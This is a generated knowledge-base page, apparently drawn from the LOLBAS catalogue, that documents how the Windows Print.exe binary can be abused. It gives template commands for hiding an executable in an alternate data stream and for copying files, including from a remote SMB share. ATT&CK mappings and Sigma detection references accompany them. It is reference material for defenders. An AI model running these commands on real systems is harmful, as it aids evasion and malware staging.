---
title: "Print.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Print.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Print.exe"
functions:
  - "ADS"
  - "Copy"
attack_technique_ids:
  - "T1564.004"
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Used by Windows to send files to the printer

## Paths

- `C:\Windows\System32\print.exe`
- `C:\Windows\SysWOW64\print.exe`

## Commands

### 1. ADS

Copy file.exe into the Alternate Data Stream (ADS) of file.txt.

```cmd
print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
```

- Use Case: Hide binary file in alternate data stream to potentially bypass defensive counter measures
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]

### 2. Copy

Copy file from source to destination

```cmd
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
```

- Use Case: Copy files
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 3. Copy

Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.

```cmd
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
```

- Use Case: Copy/Download file from remote server
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_print_remote_file_copy.yml
- IOC: Print.exe retrieving files from internet
- IOC: Print.exe creating executable files on disk

## Resources

- {'Link': 'https://twitter.com/Oddvarmoe/status/985518877076541440'}
- {'Link': 'https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410'}

## Acknowledgements

- {'Person': 'Oddvar Moe', 'Handle': '@oddvarmoe'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml)
